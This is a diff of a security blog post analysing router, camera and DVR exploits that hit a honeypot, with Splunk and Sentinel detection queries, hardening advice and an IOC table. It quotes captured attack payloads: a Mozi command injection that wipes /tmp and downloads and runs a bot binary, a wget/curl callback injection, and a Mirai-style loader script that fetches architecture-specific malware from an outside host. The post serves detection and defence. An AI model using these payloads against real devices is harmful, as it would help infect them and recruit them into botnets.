@@ -117,7 +117,7 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 <h1>Router and Camera Exploits on a Web Server: What They Mean for the Devices You Can&#x27;t Put EDR On</h1>
 <p>137 router, camera and DVR exploits hit my PHP honeypot, including Mozi bots still serving themselves and a scanner with a unique callback token per exploit. The real lesson is about the IoT devices on your own network that have no EDR. Network and endpoint detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.</p>
 <nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Network and Endpoint Detections · When It Fires · Hardening · IOCs</nav>
-<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. Both have cameras, NVRs and building systems on segmented VLANs. The web-layer KQL ran against the honeypot's real logs. The network and endpoint queries are written from the payloads shown here, so adapt the subnets and field names to your environment.</p>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. Its Falcon queries use Event Search field names; on raw FDR data, apply the <a href="/blog/honeypot-detection-playbook/#falcon">normalisation macro</a> first. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. Both have cameras, NVRs and building systems on segmented VLANs. The web-layer KQL ran against the honeypot's real logs. The network and endpoint queries are written from the payloads shown here, so adapt the subnets and field names to your environment.</p>
 
 <h2 id="what">1. What Hit the Server</h2>
 
@@ -127,8 +127,8 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 
 <p>Three senders stood out:</p>
 <ul>
-<li><strong>A 19-exploit loader</strong> (<code>195.178.110.78</code>) fired the same 19 exploits in one second, twice in one day. Its shell payload reports back at each stage, with the victim's hostname in the URL.</li>
-<li><strong>A callback scanner</strong> (<code>92.118.39.92</code>) put a unique 24-character token in each of 37 exploits, so its server knows which exploit worked on which target. One of them wasn't IoT at all. It was an attempt to run code through an unauthenticated n8n workflow API.</li>
+<li><strong>A 19-exploit loader</strong> (<code>195.178.110[.]78</code>) fired the same 19 exploits in one second, twice in one day. Its shell payload reports back at each stage, with the victim's hostname in the URL.</li>
+<li><strong>A callback scanner</strong> (<code>92.118.39[.]92</code>) put a unique 24-character token in each of 37 exploits, so its server knows which exploit worked on which target. One of them wasn't IoT at all. It was an attempt to run code through an unauthenticated n8n workflow API.</li>
 <li><strong>Mozi</strong>, a peer-to-peer botnet whose operators were reported arrested in 2021, is still spreading. 15 infected devices sent 15 requests, and most of them offered the malware from their own built-in web server.</li>
 </ul>
 
@@ -146,18 +146,18 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 <tr><td>Netgear DGN1000/DGN2200</td><td>unauthenticated syscmd, 2013</td><td>6</td><td>6</td></tr>
 <tr><td>MVPower DVR (JAWS web server)</td><td>unauthenticated shell, 2016</td><td>5</td><td>4</td></tr>
 <tr><td>Realtek SDK / D-Link UPnP SOAP</td><td>CVE-2014-8361 family</td><td>4</td><td>2</td></tr>
-<tr><td>Realtek SDK UPnP (miniigd)</td><td>CVE-2014-8361</td><td>3</td><td>2</td></tr>
 <tr><td>Tenda AC routers</td><td>CVE-2020-10987</td><td>3</td><td>2</td></tr>
-<tr><td>Huawei HG532</td><td>CVE-2017-17215</td><td>2</td><td>1</td></tr>
+<tr><td>Realtek SDK UPnP (miniigd)</td><td>CVE-2014-8361</td><td>3</td><td>2</td></tr>
 <tr><td>Zeroshell</td><td>CVE-2019-12725</td><td>2</td><td>1</td></tr>
+<tr><td>Huawei HG532</td><td>CVE-2017-17215</td><td>2</td><td>1</td></tr>
 <tr><td>Zyxel firewalls (ZTP)</td><td>CVE-2022-30525</td><td>2</td><td>1</td></tr>
-<tr><td>AVTECH cameras/DVRs</td><td>unauthenticated command injection, 2016</td><td>2</td><td>1</td></tr>
 <tr><td>D-Link NAS (DNS-320 family)</td><td>CVE-2024-3273</td><td>2</td><td>1</td></tr>
-<tr><td>TOTOLINK routers</td><td>several 2022-2024 CVEs</td><td>2</td><td>1</td></tr>
 <tr><td>DrayTek Vigor</td><td>CVE-2020-8515</td><td>2</td><td>1</td></tr>
-<tr><td>n8n workflow API</td><td>Code node abuse</td><td>1</td><td>1</td></tr>
-<tr><td>TBK DVR</td><td>CVE-2024-3721</td><td>1</td><td>1</td></tr>
+<tr><td>TOTOLINK routers</td><td>several 2022-2024 CVEs</td><td>2</td><td>1</td></tr>
+<tr><td>AVTECH cameras/DVRs</td><td>unauthenticated command injection, 2016</td><td>2</td><td>1</td></tr>
 <tr><td>Linksys E-series</td><td>&quot;TheMoon&quot; worm, 2014</td><td>1</td><td>1</td></tr>
+<tr><td>TBK DVR</td><td>CVE-2024-3721</td><td>1</td><td>1</td></tr>
+<tr><td>n8n workflow API</td><td>Code node abuse</td><td>1</td><td>1</td></tr>
 <tr><td>unattributed</td><td></td><td>34</td><td>16</td></tr>
 </tbody></table>
 <p>Every one is a command-injection in a device's web admin interface (T1190), sent blind to every IP with port 80 open (T1595.002).</p>
@@ -167,7 +167,7 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 <pre><code>POST /HNAP1/ HTTP/1.0
 Host: 13.75.195.138:80
 Content-Type: text/xml; charset="utf-8"
-SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp &amp;&amp; rm -rf * &amp;&amp; wget hxxp://211.219.49.173:4089/Mozi.m &amp;&amp; chmod 777 /tmp/Mozi.m &amp;&amp; /tmp/Mozi.m`
+SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp &amp;&amp; rm -rf * &amp;&amp; wget hxxp://211.219.49[.]173:4089/Mozi.m &amp;&amp; chmod 777 /tmp/Mozi.m &amp;&amp; /tmp/Mozi.m`
 Content-Length: 640
 
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;AddPortMapping xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;&lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;&lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;&lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;&lt;InternalPort&gt;1234&lt;/InternalPort&gt;&lt;/AddPortMapping&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre>
@@ -179,7 +179,7 @@ Content-Length: 640
 User-Agent: Go-http-client/1.1
 Content-Type: application/xml
 
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;LanguageSetting&gt;&lt;language&gt;(wget -qO- hxxp://178.83.188.141:8880/t/f6bfbfee66940e6421cf5014||curl -s hxxp://178.83.188.141:8880/t/f6bfbfee66940e6421cf5014||busybox wget -qO- hxxp://178.83.188.141:8880/t/f6bfbfee66940e6421cf5014)&gt;/dev/null 2&gt;&amp;1&lt;/language&gt;&lt;/LanguageSetting&gt;</code></pre>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;LanguageSetting&gt;&lt;language&gt;(wget -qO- hxxp://178.83.188[.]141:8880/t/f6bfbfee66940e6421cf5014||curl -s hxxp://178.83.188[.]141:8880/t/f6bfbfee66940e6421cf5014||busybox wget -qO- hxxp://178.83.188[.]141:8880/t/f6bfbfee66940e6421cf5014)&gt;/dev/null 2&gt;&amp;1&lt;/language&gt;&lt;/LanguageSetting&gt;</code></pre>
 
 <h3><span class="kc">Installation</span> Step 4: Kill the competition, pick an architecture</h3>
 <p>This decoded Mirai-family loader (User-Agent <code>KrebsOnSecurity</code>, an old in-joke) shows the standard routine:</p>
@@ -209,7 +209,7 @@ case $arch in armv7l) file=akbarniga.armv7l;;
 wget hxxp://play.nopixel-rp[.]ir/$file;
 chmod 777 $file;
 ./$file jaws</code></pre>
-<p>It kills competing bots and shells (T1562.001, T1489), picks one of thirteen builds by CPU (T1082), downloads it, and runs it from <code>/tmp</code> with a tag naming the exploit used.</p>
+<p>It kills competing bots and shells, picks one of thirteen builds by CPU (T1082), downloads it, and runs it from <code>/tmp</code> with a tag naming the exploit used.</p>
 
 <h3><span class="kc">C2 + Actions</span> Step 5: Join the botnet</h3>
 <p>Mozi uses a DHT peer-to-peer network rather than a central server, and bootstraps from the same public DHT nodes BitTorrent clients use (T1071, T1090.003). Then the device scans for the next victim and waits for DDoS orders (T1498).</p>
@@ -227,7 +227,7 @@ chmod 777 $file;
 <pre><code>let WebAccess = Syslog
 | where SyslogMessage startswith "php_http: "
 | extend j = parse_json(substring(SyslogMessage, 10))
-| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+| project TimeGenerated, DestHost = Computer, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
           Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
           UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
 
@@ -298,7 +298,8 @@ CommonSecurityLog
 | summarize Requests = count(), Urls = make_set(RequestURL, 20) by SourceIP, DestinationIP, DestinationPort</code></pre>
 <p><span class="org orgA">Org A</span></p>
 <pre><code>index=network (sourcetype=zeek:http OR sourcetype="pan:threat" log_subtype=url)
-| eval src=coalesce(id.orig_h, src_ip), url=coalesce(host.uri, url)
+| eval src=coalesce('id.orig_h', src_ip), dest_ip=coalesce('id.resp_h', dest_ip), dest_port=coalesce('id.resp_p', dest_port),
+       url=coalesce(url, 'host'.'uri')
 | where cidrmatch("10.50.0.0/16", src) OR cidrmatch("192.168.40.0/24", src)
 | where match(url, "^(https?://)?\d{1,3}(\.\d{1,3}){3}(:\d{2,5})?/")
     OR match(url, "Mozi\.[ma]|/bins/|\.(arm7|mips|mpsl)$|router\.tplink\.sh|/b/[efrn]/")
@@ -317,14 +318,14 @@ ASimDnsActivityLogs
 <p><span class="org orgA">Org A</span></p>
 <pre><code>index=dns (sourcetype=zeek:dns OR sourcetype=stream:dns)
     query IN ("router.bittorrent.com","dht.transmissionbt.com","router.utorrent.com","bttracker.debian.org")
-| eval src=coalesce(id.orig_h, src_ip)
+| eval src=coalesce('id.orig_h', src_ip)
 | where cidrmatch("10.50.0.0/16", src) OR cidrmatch("192.168.40.0/24", src)
 | stats count values(query) as queries by src</code></pre>
 <p>A camera has no reason to look up <code>router.bittorrent.com</code>. Mozi does it to join its peer network. Any hit from an IoT subnet is a confirmed infection.</p>
 
 <p>Both EDR vendors can also <em>discover</em> unmanaged devices from the managed ones around them: Defender for Endpoint device discovery, and Falcon's asset inventory. Use them to find the cameras and routers you didn't know you had, then put those in the IoT subnet lists above.</p>
 
-<h3>E1. Mirai-style loader on a Linux server (T1562.001, T1082)</h3>
+<h3>E1. Mirai-style loader on a Linux server (T1105, T1082)</h3>
 <p>The same exploits hit servers that do run EDR. If one lands, the loader's routine is distinctive:</p>
 <p><span class="org orgA">Org A</span></p>
 <pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
@@ -383,10 +384,10 @@ ASimDnsActivityLogs
 <h2 id="iocs">8. IOCs</h2>
 <table><thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead><tbody>
 <tr><td>Loader server</td><td><code>77.239.124[.]167</code> ports 80, 8099, 23413</td><td>19-exploit loader: <code>/s</code>, <code>/b/{e,f,r,n}/&lt;hostname&gt;</code>, <code>/k/a56f1a4933ad0bca/s</code></td></tr>
-<tr><td>Callback</td><td><code>178.83.188[.]141:8880/t/&lt;24 hex&gt;</code></td><td>Callback scanner <code>92.118.39.92</code></td></tr>
+<tr><td>Callback</td><td><code>178.83.188[.]141:8880/t/&lt;24 hex&gt;</code></td><td>Callback scanner <code>92.118.39[.]92</code></td></tr>
 <tr><td>Mozi</td><td><code>Mozi.m</code>, <code>Mozi.a</code>, UA <code>Hello, world</code></td><td>Self-served from infected peers</td></tr>
 <tr><td>Mirai loader</td><td><code>play.nopixel-rp[.]ir</code>, <code>akbarniga.*</code>, UA <code>KrebsOnSecurity</code></td><td>13-architecture loader</td></tr>
-<tr><td>TP-Link bot</td><td><code>221.159.119.6</code>, every 46 hours, download from <code>0.0.0.0</code></td><td>Broken bot still scanning</td></tr>
+<tr><td>TP-Link bot</td><td><code>221.159.119[.]6</code>, every 46 hours, download from <code>0.0.0.0</code></td><td>Broken bot still scanning</td></tr>
 </tbody></table>
 <aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
 <footer>
